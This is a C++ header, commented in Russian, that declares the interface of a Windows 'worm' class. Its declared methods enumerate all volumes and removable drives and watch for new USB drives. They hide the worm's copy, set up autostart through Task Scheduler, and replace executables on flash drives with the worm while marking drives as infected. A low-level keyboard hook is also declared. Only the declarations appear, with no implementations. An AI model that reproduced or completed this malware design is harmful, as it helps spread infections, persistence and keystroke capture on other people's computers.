#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <iostream>
#include <chrono>
#include <random>
#include <locale>
#include <codecvt>
#include <Lmcons.h>
#include <shlobj.h>
#include <cstdlib> // для wstring?
#include <fstream>  // для работы generate_loader_source
#include <dbt.h> // для обнаружения флешки при ее подключении

using namespace std;
namespace fs = std::filesystem;


std::wstring get_own_path();
std::wstring get_own_folder();
std::wstring get_drive_root_from_path(const std::wstring& full_path);
bool is_hidden(const fs::path& path);
void init_locale();
// Генератор случайных чисел
wstring generate_unique_suffix();
vector<wstring> get_removable_volume_paths(); // поиск всех съемных носителей
void filter_only_exe(vector<fs::path>& files); // фильтруем из всех файлов, только exe
//LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam); // для обнаружения флешки после запуска червя
void attach_console();

wstring get_username();
vector<wstring> get_all_volumes();
vector<wstring> get_paths_for_volume(const wstring& volumeName);


class worm
{
private:

	wstring path_to_start;
	vector <wstring> list_dir;
	vector <fs::path> file_to_copy;
	int iteration;
	vector <fs::path> exe_on_the_flash_drive;



public:
	worm(const wstring& path_to_start = get_own_folder(), int iteration = 2)
		: path_to_start(path_to_start), iteration(iteration) {};

	

	// Добавим статический указатель для доступа из WndProc
	static worm* instance;
	// Метод для запуска окна мониторинга
	int run_device_monitor(HINSTANCE hInstance);


	void worm_was_started();// Massage Box для отладки

	void scan_all_volumes();
	
	void search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir_tmp);// рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор
	void search_list_dir();// для старта поиска по дирректориям
	void print_list_dir();// вывод всех найденных папок, в которых будет копирование
	void collect_visible_files(); // тот же отбор, только без параметров ( чтобы использовать без указания пути, для запуска червя )
	void collect_visible_files(const vector<wstring>& list_dir_tmp, vector<fs::path>& collected_files);// функция отбирающая только видимые файлы в определенный вектор, чтобы потом копировать все что в нем есть
	void print_file_to_copy(); // выводит все файлы которые собирается копировать
	void replicate_files(); // вызов копирования без параметров 
	void replicate_files(int iteration = 1);// создает скрытые копии из вектора поля file_to_copy в те же папки 
	void copy_and_hide_worm();// чтобы добавить в таск менеджер, желательно перекопировать червя в какую-то безопасную папку
	void create_scheduled_task(const wstring& worm_path); // создаем через Task Scheduler автозапуск червя при входе пользователя в систему ( путь указываем к текущему exe )
	
	void process_all_removable_disks(); // проходимся по всем съемным носителям
	void hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path);
		
	bool infected_dir(const wstring& dir_path); // создаем файл, чтобы не заражать флкшку несколько раз
	bool dir_was_infected(const wstring& dir_path); // проверка на заражение

	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	static HHOOK keyboardHook;

	


};

